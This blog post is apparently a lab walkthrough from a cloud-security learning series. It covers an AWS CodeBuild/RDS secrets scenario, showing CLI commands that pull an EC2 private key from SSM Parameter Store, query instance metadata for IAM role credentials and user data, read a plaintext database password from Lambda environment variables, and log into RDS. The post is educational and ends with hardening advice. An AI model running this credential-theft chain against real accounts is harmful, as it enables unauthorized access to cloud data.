---
title: '100 Days of Cloud Security - Day 23: Attack — `codebuild_secrets` - Part-2'
date: '2025-12-02'
author: 'Venkata Pathuri'
excerpt: 'Day 23 of my cloud security journey - Attack — `codebuild_secrets` - Part-2'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 23: Attack — `codebuild_secrets` - Part-2

## Overview
Welcome back to Day 23 of our cloud security journey! Today, we continue our exploration of the `codebuild_secrets` attack vector, diving deeper into how misconfigurations in AWS services can lead to unauthorized access to sensitive information. Building on our previous discussions, we will learn how to exploit AWS CodeBuild and RDS permissions, leveraging secrets stored in AWS Systems Manager (SSM) Parameter Store and EC2 instance metadata. This hands-on experience highlights the importance of securing your cloud infrastructure against common vulnerabilities.

## Learning Objectives
By the end of today’s session, you will have mastered how to enumerate and exploit SSM parameters, retrieve sensitive credentials, and understand the implications of misconfigured IAM roles and environment variables in Lambda functions. You’ll gain practical experience in accessing an RDS database through various methods and learn best practices to fortify your cloud security posture.

## Deep Dive

### Attack Vector - SSM Parameter Exploitation to RDS Access

In this advanced scenario, we focus on accessing secret keys stored in RDS by exploiting misconfigurations in AWS CodeBuild and RDS permissions. We start by enumerating SSM parameters, which may reveal sensitive data.

#### Step 1: Enumerate SSM Parameters
To identify stored parameters, we can use the following command:

```bash
aws ssm describe-parameters --profile cg --region us-east-1
```

**Output Analysis:**
You might encounter parameters like:

```json
{
    "Parameters": [
        {
            "Name": "cg-ec2-private-key-cgid8tluo788h0",
            "Type": "String",
            ...
        },
        {
            "Name": "cg-ec2-public-key-cgid8tluo788h0",
            "Type": "String",
            ...
        }
    ]
}
```

This output indicates SSH key pairs that could be used to access EC2 instances, a potential entry point into your cloud environment.

#### Step 2: Retrieve Private Key
To retrieve the private key, execute:

```bash
aws ssm get-parameter --name cg-ec2-private-key-cgid8tluo788h0 --with-decryption --query 'Parameter.Value' --output text > private-key.pem
```

**Important:** Always set proper permissions on sensitive files:

```bash
chmod 400 private-key.pem
```

#### Step 3: Retrieve Public Key
The public key can be retrieved similarly:

```bash
aws ssm get-parameter --name cg-ec2-public-key-cgid8tluo788h0 --profile cg --region us-east-1
```

#### Step 4: Identify Target EC2 Instance
Now, let’s find the EC2 instance associated with the keys:

```bash
aws ec2 describe-instances --profile cg --region us-east-1
```

#### Step 5: SSH into EC2 Instance
Use the private key to SSH into the instance:

```bash
ssh -i private-key.pem ubuntu@<EC2_PUBLIC_IP>
```

Upon successful authentication, you've gained access to the EC2 instance.

#### Step 6: Extract IAM Role Credentials via IMDS
Within the EC2 instance, query the Instance Metadata Service (IMDS) to find attached IAM role credentials:

```bash
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

This command returns the IAM role name, which you can use to retrieve temporary credentials:

```bash
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>"
```

#### Step 7: Configure AWS CLI with EC2 Role Credentials
Set up a new AWS CLI profile with the retrieved credentials:

```bash
aws configure --profile cg-ec2-role
# Enter the AccessKeyId, SecretAccessKey, and set session token separately
aws configure set aws_session_token <TOKEN> --profile cg-ec2-role
```

#### Step 8: Enumerate Lambda Functions
Now, use the EC2 role to list Lambda functions:

```bash
aws lambda list-functions --region us-east-1 --profile cg-ec2-role --no-cli-page
```

**Critical Finding - Lambda Environment Variables:**
You may discover that sensitive credentials are stored in plaintext, accessible through:

```json
"Environment": {
    "Variables": {
        "DB_USER": "cgadmin",
        "DB_NAME": "securedb",
        "DB_PASSWORD": "wagrrrrwwgahhhhwwwrrggawwwwwwrr"
    }
}
```

#### Step 9: Enumerate RDS Instances
Next, describe RDS instances to find connection details:

```bash
aws rds describe-db-instances --profile cg-ec2-role --region us-east-1
```

#### Step 10: Connect to RDS Database
Connect to the database using the credentials found in the Lambda environment variables. Note that if the master password was changed in a previous lab, always use the current password:

```bash
psql postgresql://cgadmin:cloudgoat@cg-rds-instance-cgid8tluo788h0.c1o6qkm66w75.us-east-1.rds.amazonaws.com:5432/securedb
```

You should now be connected to your RDS PostgreSQL database!

### Attack Vector - Direct RDS Access via EC2 User Data
Finally, let’s examine another path to RDS by retrieving EC2 user data, which might contain sensitive information.

#### Step 1: Retrieve User Data from IMDS
Retrieve user data with:

```bash
curl -s "http://169.254.169.254/latest/user-data"
```

This data could include critical configuration details that may help in the attack.

## Hands-On Practice
Follow the steps outlined above to practice enumeration and exploitation techniques. Ensure you have the necessary IAM permissions to execute these commands. If you face issues, verify your AWS CLI configuration and ensure the correct profile is being used.

## Key Takeaways
Today’s lesson highlighted the importance of securing sensitive data in AWS environments. We explored how misconfigurations in SSM, IAM roles, and Lambda can lead to unauthorized access to critical resources. Always remember to encrypt sensitive data, enforce strict IAM policies, and regularly review your cloud configurations to mitigate the risk of exploitation.

## Real-World Applications
In production environments, understanding these vulnerabilities is crucial for maintaining robust security. Implementing best practices such as using AWS Secrets Manager for storing sensitive information, configuring IAM roles with the least privilege, and securing access to EC2 instances can significantly reduce the attack surface. Regular audits and adherence to security compliance frameworks will help safeguard your cloud infrastructure against similar attacks.

---
**Journey Progress:** 23/100 Days Complete 🚀